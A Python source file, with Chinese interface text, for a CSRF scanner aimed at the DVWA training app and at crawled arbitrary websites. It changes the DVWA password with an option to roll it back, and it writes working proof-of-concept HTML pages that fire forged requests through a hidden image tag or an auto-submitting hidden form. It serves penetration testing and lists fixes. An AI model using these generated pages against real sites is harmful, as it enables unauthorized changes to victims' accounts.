import os
import sys
import time
import json
import random
import string
from urllib.parse import urljoin, urlparse, urlencode
from typing import Dict, List, Optional, Any, Tuple
import requests
from bs4 import BeautifulSoup
from colorama import Fore, init
from datetime import datetime

try:
    from DVWAlogin import DvwaLogin
    from crawler import VulnerabilityCrawler

    print(f"{Fore.GREEN}[✓] 依赖模块加载成功")
except Exception as e:
    print(f"{Fore.RED}[✗] 依赖加载失败: {e}")
    sys.exit(1)

init(autoreset=True)


class DvwaCSRFScanner:
    def __init__(self, session, mode="dvwa", base_url=None, original_password="password"):
        self.session = session
        self.mode = mode
        self.base_url = base_url.rstrip('/') if base_url else None
        self.original_password = original_password
        self.current_password = original_password
        self.should_rollback = True
        self.force_rollback = False
        self.timeout = 10

        if mode == "dvwa":
            self.target_url = urljoin(self.base_url, "vulnerabilities/csrf/")
        else:
            self.target_url = None

        self.report_dir = os.path.join("scan_result", "DvwaCSRFScanner")
        os.makedirs(self.report_dir, exist_ok=True)

        self.results = {
            'target_url': None,
            'vulnerabilities': [],
            'scan_time': None,
            'forms_tested': 0,
            'csrf_points_found': 0
        }

    def cleanup(self):
        if self.should_rollback and self.current_password != self.original_password:
            print(f"\n{Fore.YELLOW}[*] 执行最终回滚...")
            self._rollback_password()
        elif not self.should_rollback:
            print(f"\n{Fore.GREEN}[*] 按用户选择，密码保持为: {self.current_password}")

    def _rollback_password(self, max_retries=5):
        if not self.session or not self.base_url:
            return False

        try:
            form = self.extract_csrf_form()
            if not form:
                print(f"{Fore.RED}[✗] 无法回滚：未找到密码修改表单")
                return False

            rollback_url = form['action']
            current_pass = self.current_password
            original_pass = self.original_password

            try:
                self.session.get(rollback_url, timeout=5)
            except:
                pass

            for attempt in range(1, max_retries + 1):
                try:
                    data = {
                        "password_current": current_pass,
                        "password_new": original_pass,
                        "password_conf": original_pass,
                        "Change": "Change"
                    }

                    ok, resp = self.send_request(
                        rollback_url,
                        method=form['method'],
                        **({'params': data} if form['method'] == 'GET' else {'data': data})
                    )

                    if not ok or not resp:
                        print(f"{Fore.YELLOW}[!] 回滚请求失败，第{attempt}次重试…")
                        time.sleep(1)
                        continue

                    text = resp.text.lower()
                    success_keywords = [
                        'password changed',
                        'password updated',
                        'password has been changed',
                        'successfully'
                    ]

                    if any(k in text for k in success_keywords):
                        print(f"{Fore.GREEN}[✓] 密码回滚成功：{original_pass}")
                        self.current_password = original_pass
                        return True

                    print(f"{Fore.YELLOW}[!] 第{attempt}次回滚失败，页面未返回成功提示")

                except Exception as e:
                    print(f"{Fore.YELLOW}[!] 回滚异常: {e}，重试中…")

                time.sleep(1)

            print(f"{Fore.RED}[✗] 回滚失败，请手动将密码恢复为：{original_pass}")
            return False

        except Exception as e:
            print(f"{Fore.RED}[✗] 回滚出现致命错误: {e}")
            return False

    def setup_session(self, dvwa_login_instance: DvwaLogin) -> bool:
        try:
            session_info = dvwa_login_instance.get_session_info()
            if not session_info or 'session' not in session_info:
                print(f"{Fore.RED}[✗] 会话信息无效")
                return False

            self.session = session_info['session']
            self.base_url = session_info['base_url']
            print(f"{Fore.GREEN}[✓] 会话设置: {self.base_url}")
            return True
        except Exception as e:
            print(f"{Fore.RED}[✗] 设置失败: {e}")
            return False

    def detect_dvwa_level(self) -> str:
        try:
            response = self.session.get(f"{self.base_url}/security.php", timeout=10)
            if 'low' in response.text:
                return 'low'
            elif 'medium' in response.text:
                return 'medium'
            elif 'high' in response.text:
                return 'high'
            return 'unknown'
        except:
            return 'unknown'

    def send_request(self, url: str, method: str = 'GET', data: Dict = None, params: Dict = None,
                     headers: Dict = None, json_data: Any = None) -> Tuple[bool, Optional[requests.Response]]:
        headers = headers or {}
        try:
            resp = self.session.request(
                method=method.upper(),
                url=url,
                params=params,
                data=data,
                json=json_data,
                headers=headers,
                timeout=self.timeout,
                verify=False
            )
            return True, resp
        except Exception as e:
            print(f"{Fore.RED}[✗] 请求失败: {e}")
            return False, None

    def extract_csrf_form(self) -> Dict[str, Any]:
        target_url = f"{self.base_url}/vulnerabilities/csrf/"
        success, response = self.send_request(target_url)
        if not success or not response:
            return {}

        soup = BeautifulSoup(response.text, 'html.parser')
        form = soup.find('form')
        if not form:
            return {}

        raw_action = form.get('action', '').strip()
        if raw_action in ['', '#']:
            action = target_url
        else:
            action = urljoin(target_url, raw_action)

        method = form.get('method', 'POST').upper()

        inputs = []
        for tag in form.find_all(['input', 'textarea', 'select', 'button']):
            name = tag.get('name')
            if name and 'token' not in name.lower() and 'csrf' not in name.lower():
                inputs.append(name)

        return {'action': action, 'method': method, 'inputs': inputs}

    def test_csrf_vulnerability(self, level: str) -> Dict[str, Any]:
        form = self.extract_csrf_form()
        if not form:
            return {'vulnerable': False, 'reason': '未找到CSRF表单'}

        new_pass = "baipi666"
        old_pass = self.current_password

        test_data = {
            'password_current': old_pass,
            'password_new': new_pass,
            'password_conf': new_pass,
            'Change': 'Change'
        }

        try:
            ok, resp = self.send_request(
                form['action'],
                method=form['method'],
                **({'params': test_data} if form['method'] == 'GET' else {'data': test_data})
            )

            if not ok or not resp:
                return {'vulnerable': False, 'reason': '请求失败'}

            success_keywords = [
                'password changed',
                'password updated',
                'password has been changed',
                'successfully'
            ]

            text = resp.text.lower()
            success = any(k in text for k in success_keywords)

            if success:
                self.current_password = new_pass

                vuln_info = {
                    'vulnerable': True,
                    'level': level,
                    'target_url': form['action'],
                    'method': form['method'],
                    'payload': test_data,
                    'risk_level': 'high',
                }

                filename = self.generate_poc_html(vuln_info)
                vuln_info['poc_file'] = filename

                return vuln_info

            return {'vulnerable': False, 'reason': '页面未返回成功提示'}

        except Exception as e:
            return {'vulnerable': False, 'reason': f'异常: {e}'}

    def generate_poc_html(self, vuln):
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        random_str = ''.join(random.choices(string.ascii_lowercase, k=6))
        filename = f"csrf_poc_{vuln['level']}_{timestamp}_{random_str}.html"
        abs_filename = os.path.join(self.report_dir, filename)

        attack_url = f"{vuln['target_url']}?{urlencode(vuln['payload'])}"

        html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>CSRF POC - {vuln['level'].upper()}</title>
</head>
<body>
    <h2>CSRF POC - {vuln['level'].upper()}</h2>
    <img src="{attack_url}" style="display:none;">
    <p style="color:red;">CSRF 攻击已发送，请检查密码是否被修改！</p>
</body>
</html>"""

        with open(abs_filename, "w", encoding="utf-8") as f:
            f.write(html)

        return abs_filename

    def generate_report(self) -> Dict[str, Any]:
        return {
            'scan_summary': {
                'target_url': self.results['target_url'],
                'scan_time': self.results['scan_time'],
                'forms_tested': self.results['forms_tested'],
                'csrf_points_found': self.results['csrf_points_found'],
                'poc_files': [v.get('poc_file') for v in self.results['vulnerabilities']],
                'rollback_enabled': self.should_rollback,
                'report_dir': self.report_dir
            },
            'vulnerabilities': self.results['vulnerabilities'],
            'recommendations': [
                "实施CSRF Token（随机+单次有效）",
                "验证Referer/Origin头",
                "使用SameSite=Strict Cookie",
                "重要操作要求二次验证",
                "限制请求频率"
            ]
        }

    def print_report(self, report: Dict[str, Any]):
        summary = report['scan_summary']

        print(f"\n{Fore.YELLOW}{'=' * 70}")
        print(f"  {Fore.CYAN}DVWA CSRF扫描报告")
        print(f"{Fore.YELLOW}{'=' * 70}")
        print(f"{Fore.GREEN}等级: {self.detect_dvwa_level().upper()}")
        print(f"{Fore.GREEN}表单: {summary['forms_tested']}个")
        print(f"{Fore.GREEN}漏洞: {summary['csrf_points_found']}个")
        print(f"{Fore.YELLOW}回滚: {'已启用' if summary['rollback_enabled'] else '已禁用'}")
        print(f"{Fore.CYAN}报告目录: {summary['report_dir']}")
        print(f"{Fore.YELLOW}{'=' * 70}")

        if not report['vulnerabilities']:
            print(f"{Fore.GREEN}\n[✓] 未发现CSRF漏洞")
            return

        for vuln in report['vulnerabilities']:
            print(f"\n{Fore.RED}[!] CSRF漏洞验证成功！")
            print(f"{Fore.CYAN}方法: {vuln['method']}")
            print(f"{Fore.CYAN}目标: {vuln['target_url']}")
            print(f"{Fore.CYAN}新密码: baipi666")
            if vuln.get('bypass'):
                print(f"{Fore.MAGENTA}绕过: {vuln['bypass']}")
            print(f"{Fore.GREEN}[POC] {vuln['poc_file']}")

        print(f"\n{Fore.CYAN}修复建议:")
        for i, rec in enumerate(report['recommendations'], 1):
            print(f"  {i}. {rec}")

    def scan_dvwa_csrf(self) -> Dict[str, Any]:
        if not self.session or not self.base_url:
            print(f"{Fore.RED}[✗] 未初始化会话")
            return {}

        level = self.detect_dvwa_level()
        print(f"{Fore.GREEN}[*] DVWA安全等级: {level.upper()}")

        self.results['target_url'] = self.base_url
        self.results['scan_time'] = time.strftime('%Y-%m-%d %H:%M:%S')

        if self.force_rollback:
            print(f"\n{Fore.YELLOW}[*] 强制模式：自动回滚密码")
            self.should_rollback = True
        else:
            print(f"\n{Fore.YELLOW}[?] 由于现代浏览器默认SameSite=Lax，CSRF POC可能无效")
            print(f"{Fore.YELLOW}[?] 是否要在测试后回滚密码到原始值？")
            choice = input(f"{Fore.YELLOW}[?] 输入 'y' 回滚，输入 'n' 不回滚 (默认: y): ").strip().lower()
            self.should_rollback = choice != 'n'

        if self.should_rollback:
            print(f"{Fore.GREEN}[*] 已启用测试后回滚密码")
        else:
            print(f"\n{Fore.RED}[!] ===========================================")
            print(f"{Fore.RED}[!] 警告：您选择了不回滚密码！")
            print(f"{Fore.RED}[!] 密码已修改为: baipi666")
            print(f"{Fore.RED}[!] 后续扫描模块（SQL、XSS、命令注入等）将无法登录！")
            print(f"{Fore.RED}[!] 必须手动将密码改回 'password' 才能继续")
            print(f"{Fore.YELLOW}[!] 操作步骤：")
            print(f"{Fore.YELLOW}[!] 1. 使用 'baipi666' 登录 DVWA")
            print(f"{Fore.YELLOW}[!] 2. 进入 CSRF 漏洞页面")
            print(f"{Fore.YELLOW}[!] 3. 将密码改回 'password'")
            print(f"{Fore.RED}[!] ===========================================")

        print(f"\n{Fore.YELLOW}[扫描目标: {self.base_url}/vulnerabilities/csrf/]")

        vuln_result = self.test_csrf_vulnerability(level)

        if vuln_result.get('vulnerable'):
            self.results['vulnerabilities'].append(vuln_result)
            self.results['csrf_points_found'] = 1
            self.results['forms_tested'] = 1

            if self.should_rollback:
                print(f"\n{Fore.CYAN}[*] 正在回滚密码...")
                self._rollback_password()

        return self.generate_report()

    def detect_generic(self, crawl_results: Dict[str, Any]):
        print(f"\n{Fore.CYAN}{'=' * 60}")
        print(f"{Fore.CYAN}通用 CSRF 漏洞检测")
        print(f"{Fore.CYAN}{'=' * 60}")

        forms = crawl_results.get('forms', [])
        if not forms:
            print(f"{Fore.YELLOW}[!] 未从爬虫结果中发现表单")
            return

        # 去重：按表单URL去重
        unique_forms = []
        seen_urls = set()
        for form in forms:
            url = form.get('url')
            if url and url not in seen_urls:
                seen_urls.add(url)
                unique_forms.append(form)

        forms = unique_forms

        print(f"\n{Fore.YELLOW}[i] 请提供测试账户（用于登录目标网站）")
        test_user = input("用户名: ").strip()
        test_pass = input("密码: ").strip()

        print(f"\n{Fore.CYAN}[→] 正在登录目标网站...")
        victim_session = requests.Session()
        victim_session.headers.update({'User-Agent': 'Mozilla/5.0'})

        login_url = urljoin(self.base_url, "/login")
        login_data = {
            "username": test_user, "user": test_user,
            "password": test_pass, "pass": test_pass,
            "login": "Login", "submit": "Submit"
        }
        resp = victim_session.post(login_url, data=login_data, timeout=10)

        if resp.status_code != 200 or "login" in resp.url.lower():
            print(f"{Fore.YELLOW}[!] 自动登录可能失败，请检查账户是否正确")

        print(f"{Fore.GREEN}[✓] 受害者会话已建立")

        results = []
        for idx, form in enumerate(forms, 1):
            print(f"\n{Fore.BLUE}{'─' * 60}")
            print(f"{Fore.BLUE}测试进度: [{idx}/{len(forms)}]")
            print(f"{Fore.BLUE}表单URL: {form['url']}")

            result = self._test_csrf_manual(victim_session, form)
            results.append(result)

        self.save_generic_report(results)

    def _test_csrf_manual(self, victim_session, form: Dict) -> Dict:
        target_url = form['url']
        method = form.get('method', 'POST').upper()

        test_data = self._generate_test_payload(form.get('form_data', {}))
        poc_file = self.generate_poc(target_url, test_data, method, mode="generic")

        print(f"\n{Fore.YELLOW}{'=' * 60}")
        print(f"{Fore.YELLOW}测试步骤")
        print(f"{Fore.YELLOW}{'=' * 60}")
        print(f"{Fore.CYAN}1. 在浏览器中登录目标网站（保持登录状态）")
        print(f"{Fore.CYAN}2. 在同浏览器的**新标签页**打开: file://{poc_file}")
        print(f"{Fore.CYAN}3. 观察页面是否显示'CSRF攻击已执行'")
        print(f"{Fore.CYAN}4. 手动检查目标网站数据是否被修改")
        print(f"{Fore.YELLOW}{'=' * 60}")
        print(f"{Fore.MAGENTA}[!] 请手动确认后，在报告中记录结果")

        return {
            "url": target_url,
            "method": method,
            "vulnerable": None,
            "poc_file": poc_file,
            "message": "需手动验证CSRF POC有效性",
            "test_data": test_data
        }

    def _generate_test_payload(self, form_data: Dict) -> Dict:
        payload = {}
        for key, value in form_data.items():
            if isinstance(value, str):
                if 'password' in key.lower():
                    payload[key] = 'TestCSRF123!'
                elif 'email' in key.lower():
                    payload[key] = 'csrf_test_' + str(random.randint(1000, 9999)) + '@example.com'
                elif 'username' in key.lower() or 'name' in key.lower():
                    payload[key] = 'csrf_user_' + ''.join(random.choices(string.ascii_lowercase, k=4))
                else:
                    payload[key] = str(value) + '_csrf_test'
            else:
                payload[key] = value
        return payload

    def generate_poc(self, target_url: str, form_data: Dict, method: str, mode="dvwa") -> str:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        random_str = ''.join(random.choices(string.ascii_lowercase, k=6))

        if mode == "dvwa":
            filename = f"csrf_poc_{mode}_{timestamp}_{random_str}.html"
        else:
            parsed = urlparse(target_url)
            path_name = parsed.path.replace('/', '_').strip('_')[:20]
            filename = f"csrf_poc_generic_{path_name}_{timestamp}_{random_str}.html"

        poc_path = os.path.join(self.report_dir, filename)

        if method == 'GET':
            query_string = urlencode(form_data)
            attack_url = f"{target_url}?{query_string}"
            html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>CSRF POC - GET请求</title>
</head>
<body>
    <h2>CSRF POC - GET请求</h2>
    <p>目标: {target_url}</p>
    <img src="{attack_url}" width="1" height="1" style="display:none;">
    <p style="color:red; font-weight:bold;">CSRF攻击已执行！请检查目标网站数据是否被修改。</p>
</body>
</html>"""
        else:
            form_fields = "\n".join([
                f'<input type="hidden" name="{k}" value="{v}">'
                for k, v in form_data.items()
            ])

            html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>CSRF POC - POST请求</title>
</head>
<body>
    <h2>CSRF POC - POST请求</h2>
    <p>目标: {target_url}</p>
    <form id="csrfForm" action="{target_url}" method="POST">
        {form_fields}
    </form>
    <script>document.getElementById("csrfForm").submit();</script>
    <p style="color:red; font-weight:bold;">CSRF攻击已执行！请检查目标网站数据是否被修改。</p>
</body>
</html>"""

        with open(poc_path, "w", encoding="utf-8") as f:
            f.write(html)

        return poc_path

    def save_generic_report(self, results: List[Dict]):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

        report = {
            "mode": "generic",
            "target_base": self.base_url,
            "scan_time": timestamp,
            "summary": {
                "total_forms": len(results)
            },
            "results": results,
            "notes": "此报告中的CSRF漏洞需要手动验证，请按POC文件的说明操作"
        }

        filename = f"csrf_report_generic_{timestamp}.json"
        report_path = os.path.join(self.report_dir, filename)

        with open(report_path, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=4, ensure_ascii=False)

        print(f"\n{Fore.GREEN}[✓] 通用模式报告已保存: {report_path}")


def main():
    print("=" * 60)
    print("    CSRF漏洞扫描程序")
    print("=" * 60)

    print("\n选择目标类型:")
    print("1. DVWA (固定路径)")
    print("2. 其他网站 (生成POC后手动验证)")

    choice = input("\n请输入选项 (1/2): ").strip()

    if choice == "1":
        url = input("请输入 DVWA 首页 URL: ").strip()
        if not url:
            print(f"{Fore.RED}[✗] URL 不能为空")
            return

        print(f"{Fore.CYAN}[i] 正在登录 DVWA...")
        dvwa = DvwaLogin()
        if not dvwa.login(url):
            print(f"{Fore.RED}[✗] DVWA 登录失败")
            return

        print(f"{Fore.GREEN}[✓] DVWA 登录成功")
        dvwa.test_connection()

        session_info = dvwa.get_session_info()

        scanner = DvwaCSRFScanner(
            session_info['session'],
            mode="dvwa",
            base_url=session_info['base_url'],
            original_password="password"
        )

        try:
            report = scanner.scan_dvwa_csrf()
            scanner.print_report(report)

            if scanner.should_rollback:
                print(f"\n{Fore.YELLOW}[*] 验证回滚结果...")
                test_login = DvwaLogin()
                if test_login.login(url):
                    print(f"{Fore.GREEN}[✓] 验证成功：密码已回滚到 password")
                else:
                    print(f"{Fore.RED}[✗] 验证失败：密码未正确回滚！")

            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            report_path = os.path.join(scanner.report_dir, f"dvwa_csrf_report_{timestamp}.json")
            with open(report_path, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2, ensure_ascii=False)
            print(f"\n{Fore.GREEN}[✓] 报告已保存: {report_path}")

        finally:
            scanner.cleanup()

    elif choice == "2":
        url = input("请输入目标网站 URL: ").strip()
        depth_input = input("请输入爬取深度 (默认2): ").strip()
        crawl_depth = int(depth_input) if depth_input.isdigit() else 2

        print(f"\n{Fore.CYAN}[i] 正在爬取网站...")
        crawler = VulnerabilityCrawler(url, max_depth=crawl_depth)
        crawler.crawl(url)
        crawl_results = crawler.get_results()

        print(f"{Fore.GREEN}[✓] 爬取完成，发现 {len(crawl_results.get('forms', []))} 个表单")

        scanner = DvwaCSRFScanner(None, mode="generic", base_url=url)
        scanner.detect_generic(crawl_results)

    else:
        print(f"{Fore.RED}[✗] 无效选项")


if __name__ == "__main__":
    main()